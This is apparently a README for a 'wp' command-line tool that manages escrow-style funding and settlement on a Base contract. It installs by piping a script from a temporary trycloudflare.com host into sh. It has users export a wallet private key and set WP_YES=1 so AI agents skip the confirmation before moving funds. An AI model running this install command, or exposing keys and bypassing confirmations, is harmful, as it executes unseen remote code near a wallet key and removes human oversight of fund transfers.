# WP CLI

The public CLI source is tracked at `cli/wp` and is distributed by the landing-page installer:

```bash
curl -fsSL https://page-outlets-outcomes-recommends.trycloudflare.com/install.sh | sh
```

Landing page:

```text
https://page-outlets-outcomes-recommends.trycloudflare.com/
```

## Signer setup

Read-only commands do not need a private key. Write commands need a signer that pays Base gas and is authorized for the action.

Use a hot wallet only:

```bash
export WP_PRIVATE_KEY=0xYOUR_HOT_WALLET_PRIVATE_KEY
```

For AI agents and scripts that cannot answer an interactive confirmation prompt:

```bash
export WP_YES=1
```

## Command shapes

```bash
# Create table on default contract
wp 0xSELLER 0xBUYER

# Read table state
wp 0xCONTRACT:42

# Fund
wp 0xCONTRACT:42 +0.05:ETH
wp 0xCONTRACT:42 +26:USDC
wp 0xCONTRACT:42 +100:0xTOKEN_ADDRESS

# Buyer/controller settlement
wp 0xCONTRACT:42 release
wp 0xCONTRACT:42 burn

# Seller withdraw after release
wp 0xCONTRACT:42 -0.05:ETH
wp 0xCONTRACT:42 -26:USDC
```

Token is always explicit for fund/withdraw: `+amount:TOKEN` or `-amount:TOKEN`.
